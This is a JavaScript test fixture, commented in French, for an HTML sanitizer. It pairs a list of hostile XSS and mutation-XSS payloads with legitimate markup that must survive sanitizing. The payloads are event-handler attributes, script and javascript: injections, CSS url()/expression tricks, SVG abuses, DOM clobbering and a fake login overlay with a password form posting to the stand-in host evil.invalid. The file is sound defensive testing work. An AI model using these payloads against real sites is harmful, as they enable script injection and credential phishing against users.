/*
 * Batterie d'essais de `js/safe-html.js` : charges hostiles (ce qui ne doit JAMAIS survivre) et gabarits légitimes (ce qui doit survivre).
 * Partagée par `dev-tests/safe-html-test.html` (qui l'exécute dans un vrai navigateur : la reconstruction touche le DOM) et par
 * `dev-tests/test-safe-html.js` (qui vérifie ici que la batterie est complète). Aucune dépendance.
 *
 * Un cas : { name, html, absent: [sélecteurs CSS qui ne doivent trouver AUCUN élément], present: [sélecteurs qui doivent en trouver],
 *            text: texte attendu (facultatif) }. Les charges prennent soin de lever `window.__pwned` si elles s'exécutent ;
 * les adresses `evil.invalid` détectent une requête réseau lancée par une image ou une feuille de style.
 */
(function (root, factory) {
  const api = factory();
  if (typeof module !== 'undefined' && module.exports) module.exports = api;
  else root.SafeHtmlCases = api;
})(typeof globalThis !== 'undefined' ? globalThis : this, function () {
  'use strict';
  const PWN = 'window.__pwned=(window.__pwned||0)+1';

  const HOSTILE = [
    { name: 'image avec onerror', html: `<img src="//evil.invalid/x.png" onerror="${PWN}">`, absent: ['img'] },
    { name: 'script', html: `<script>${PWN}</script><p>après</p>`, absent: ['script'], present: ['p'] },
    { name: 'script en capitales mélangées', html: `<ScRiPt>${PWN}</ScRiPt>`, absent: ['script'] },
    { name: 'gestionnaire sur un bouton', html: `<button type="button" onclick="${PWN}" onmouseover="${PWN}">ok</button>`, present: ['button'], absentAttrs: ['onclick', 'onmouseover'] },
    { name: 'gestionnaire sur une div (focus, toggle)', html: `<div tabindex="0" onfocus="${PWN}" onfocusin="${PWN}" ontoggle="${PWN}" onanimationstart="${PWN}">x</div>`, present: ['div'], absentAttrs: ['onfocus', 'onfocusin', 'ontoggle', 'onanimationstart'] },
    { name: 'svg avec onload', html: `<svg viewBox="0 0 10 10" onload="${PWN}"><path d="M0 0L5 5"/></svg>`, present: ['svg', 'path'], absentAttrs: ['onload'] },
    { name: 'script dans un svg', html: `<svg><script>${PWN}</script><circle r="1"/></svg>`, absent: ['script'], present: ['circle'] },
    { name: 'svg use vers une adresse externe', html: '<svg><use href="//evil.invalid/s.svg#a"/></svg>', absent: ['use'] },
    { name: 'svg foreignObject et iframe', html: `<svg><foreignObject><iframe srcdoc="<script>${PWN}</script>"></iframe></foreignObject></svg>`, absent: ['foreignobject', 'iframe'] },
    { name: 'svg image externe', html: '<svg><image href="//evil.invalid/i.png"/></svg>', absent: ['image'] },
    { name: 'svg animate / set (déclenchent des évènements)', html: `<svg><a><animate attributeName="href" values="javascript:${PWN}"/></a><set attributeName="onmouseover" to="${PWN}"/></svg>`, absent: ['animate', 'set', 'a'] },
    { name: 'lien javascript:', html: `<a href="javascript:${PWN}">cliquer</a>`, absent: ['a'] },
    { name: 'iframe', html: '<iframe src="//evil.invalid/"></iframe>', absent: ['iframe'] },
    { name: 'object et embed', html: '<object data="//evil.invalid/x"></object><embed src="//evil.invalid/x">', absent: ['object', 'embed'] },
    { name: 'link, meta, base, style', html: '<link rel="stylesheet" href="//evil.invalid/a.css"><meta http-equiv="refresh" content="0;url=//evil.invalid/"><base href="//evil.invalid/"><style>@import url(//evil.invalid/b.css);</style>', absent: ['link', 'meta', 'base', 'style'] },
    { name: 'formulaire', html: '<form action="//evil.invalid/" method="post"><input name="p" type="password"><button type="submit">Envoyer</button></form>', absent: ['form', 'input[type=password]'] },
    { name: 'champ avec autofocus et onfocus', html: `<input type="text" autofocus onfocus="${PWN}">`, present: ['input'], absentAttrs: ['autofocus', 'onfocus'] },
    { name: 'mutation (mXSS) par math et style', html: `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=${PWN}&gt;">`, absent: ['img', 'style', 'mglyph', 'math'] },
    { name: 'mutation (mXSS) par noscript', html: `<noscript><p title="</noscript><img src=x onerror=${PWN}>"></noscript>`, absent: ['img', 'noscript'] },
    { name: 'template', html: `<template><img src=x onerror="${PWN}"></template>`, absent: ['template', 'img'] },
    { name: 'details et marquee', html: `<details open ontoggle="${PWN}"><summary>x</summary></details><marquee onstart="${PWN}">y</marquee>`, absent: ['details', 'marquee'] },
    { name: 'video et audio', html: `<video><source src="//evil.invalid/v.mp4" onerror="${PWN}"></video><audio src="//evil.invalid/a.mp3" onerror="${PWN}"></audio>`, absent: ['video', 'audio', 'source'] },
    { name: 'style : url()', html: '<div style="background:url(//evil.invalid/p.png);color:red">x</div>', present: ['div'], styleAbsent: ['url('], styleKept: ['color'] },
    { name: 'style : url() échappé', html: '<div style="background:\\75rl(//evil.invalid/p.png)">x</div>', present: ['div'], styleAbsent: ['url(', '\\'] },
    { name: 'style : expression et javascript', html: `<div style="width:expression(${PWN});background:javascript:${PWN};height:10px">x</div>`, present: ['div'], styleAbsent: ['expression', 'javascript'], styleKept: ['height'] },
    { name: 'style : superposition de la page entière', html: '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff">faux écran de connexion</div>', present: ['div'], styleAbsent: ['fixed'] },
    { name: 'style : sticky', html: '<div style="position:sticky;top:0">x</div>', present: ['div'], styleAbsent: ['sticky'] },
    { name: 'style : @import et commentaire', html: '<div style="/* x */ @import url(//evil.invalid/x.css); color:red">x</div>', present: ['div'], styleAbsent: ['@import', 'evil'] },
    { name: 'style : liaison de comportement', html: '<div style="behavior:url(x.htc);-moz-binding:url(x.xml#a);color:blue">x</div>', present: ['div'], styleAbsent: ['behavior', 'binding'], styleKept: ['color'] },
    { name: 'attribut id et name (écrasement de window/document)', html: '<div id="GristBI" name="location">x</div><img name="cookie" src="//evil.invalid/x">', absentAttrs: ['id', 'name'], absent: ['img'] },
    { name: 'attribut srcdoc, formaction, href sur un bouton', html: '<button formaction="//evil.invalid/" href="//evil.invalid/" srcdoc="<b>x</b>">b</button>', present: ['button'], absentAttrs: ['formaction', 'href', 'srcdoc'] },
    { name: 'attribut xlink:href en svg', html: `<svg xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M0 0" xlink:href="javascript:${PWN}"/></svg>`, present: ['path'], absentAttrs: ['xlink:href'] },
    { name: 'svg : fill avec url() externe', html: '<svg><rect width="5" height="5" fill="url(//evil.invalid/a.svg#g)"/></svg>', present: ['rect'], absentAttrs: ['fill'] },
    { name: 'octet nul et balise coupée', html: `<scr\u0000ipt>${PWN}</scr\u0000ipt><img/src=x onerror=${PWN}//`, absent: ['script', 'img'] },
    { name: 'classes détournées', html: `<div class='a" onmouseover="${PWN}'>x</div>`, present: ['div'], absentAttrs: ['onmouseover'] },
    { name: 'tabindex et role invalides', html: '<div role="x y" tabindex="javascript:1">x</div>', present: ['div'], absentAttrs: ['role', 'tabindex'] },
    { name: 'données : attribut data- au nom invalide', html: `<div data-="1" data-a_b="2" data-x"onclick="${PWN}">x</div>`, present: ['div'], absentAttrs: ['onclick'] },
    { name: 'textarea et select (champs qui capturent la saisie)', html: '<textarea>a</textarea><select><option>b</option></select>', absent: ['textarea', 'select', 'option'] },
  ];

  const LEGITIMATE = [
    {
      name: 'carte de type (icône svg + texte + attributs de donnée)',
      html: '<svg viewBox="0 0 24 24" class="icon" aria-hidden="true" focusable="false"><path d="M3 3h18v18H3z" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg><span class="type-card-name">Barres</span>',
      present: ['svg.icon[viewBox]', 'path[stroke-linecap]', 'span.type-card-name'], text: 'Barres',
    },
    {
      name: 'ligne de pastille de filtre (données échappées, bouton nommé)',
      html: '<span class="filter-badge" data-level="warn"><button type="button" class="chip-remove" data-id="a&amp;b" aria-label="Retirer &lt;b&gt;" title="Retirer">×</button></span>',
      present: ['span.filter-badge[data-level="warn"]', 'button[data-id="a&b"][aria-label="Retirer <b>"]'], text: '×',
    },
    {
      name: 'tableau croisé coloré (couleurs en ligne)',
      html: '<table class="pivot-table pivot-heat"><thead><tr><th scope="col" class="pivot-col" data-axis="col">A</th></tr></thead><tbody><tr><td class="pivot-cell" data-row="r" data-col="c" style="background:#e1ecf7;color:#000000">12</td></tr></tbody></table>',
      present: ['table.pivot-heat', 'th[scope=col]', 'td.pivot-cell[data-row="r"]'], styleOn: { selector: 'td.pivot-cell', kept: ['background', 'color'] }, text: 'A12',
    },
    {
      name: "barre d'objectif et gantt (largeurs en pourcentage, position)",
      html: '<div role="progressbar" aria-valuemin="0" aria-valuemax="100" class="bar" style="width:42.5%;left:10%;position:absolute;display:inline-block"></div>',
      present: ['div[role=progressbar][aria-valuemax="100"]'], styleOn: { selector: 'div.bar', kept: ['width', 'left', 'position', 'display'] },
    },
    {
      name: "infobulle d'ECharts (styles, flottants, marqueur rond)",
      html: '<div style="margin:0px 0 0;line-height:1;"><div style="font-size:12px;color:#0b0b0b;font-weight:400;line-height:1;">Avril</div><div style="margin:10px 0 0;line-height:1;"><span style="display:inline-block;margin-right:4px;border-radius:10px;width:10px;height:10px;background-color:#5470c6;"></span><span style="font-size:12px;color:#666;font-weight:400;margin-left:2px">Montant</span><span style="float:right;margin-left:20px;font-size:12px;color:#666;font-weight:900">1 234</span><div style="clear:both"></div></div></div>',
      present: ['div span'], styleOn: { selector: 'span', kept: ['display', 'margin-right', 'border-radius', 'width', 'height', 'background-color'] }, text: 'AvrilMontant1 234',
    },
    {
      name: 'courbe KPI (polyline, points, cercle)',
      html: '<svg viewBox="0 0 100 30" preserveAspectRatio="none" aria-hidden="true" focusable="false"><polyline points="0,20 50,10 100,5" fill="none" stroke="#2f5d8c" stroke-width="2"/><circle cx="100" cy="5" r="2"/></svg>',
      present: ['svg[viewBox="0 0 100 30"]', 'svg[preserveAspectRatio]', 'polyline[points]', 'circle[r]'],
    },
    {
      name: 'liste de choix du combobox (mark, rôle option)',
      html: '<li class="combobox-option" data-value="Nord" role="option">No<mark>rd</mark></li>',
      present: ['li[role=option][data-value=Nord]', 'mark'], text: 'Nord',
    },
    {
      name: 'case à cocher de la table plate',
      html: '<label><input type="checkbox" checked> <span>Montant</span></label><button type="button" class="col-move" data-dir="1" aria-label="Descendre">▼</button>',
      present: ['label input[type=checkbox][checked]', 'button.col-move'], text: ' Montant▼',
    },
    {
      name: "texte d'une tuile Texte (titres, listes, gras)",
      html: '<h3>Titre</h3><h4>Sous-titre</h4><p>un <strong>mot</strong><br>suite</p><ul><li>un</li><li>deux</li></ul>',
      present: ['h3', 'h4', 'strong', 'ul li'], text: 'TitreSous-titreun motsuiteundeux',
    },
    {
      name: 'avertissement avec code (data-i18n-html)',
      html: 'La bibliothèque (<code>js/vendor/echarts/echarts.min.js</code>) manque.',
      present: ['code'], text: 'La bibliothèque (js/vendor/echarts/echarts.min.js) manque.',
    },
    {
      name: 'texte avec balises échappées (jamais interprétées)',
      html: '&lt;img src=x onerror=alert(1)&gt; &amp; &quot;guillemets&quot;',
      absent: ['img'], text: '<img src=x onerror=alert(1)> & "guillemets"',
    },
  ];

  return { HOSTILE, LEGITIMATE };
});
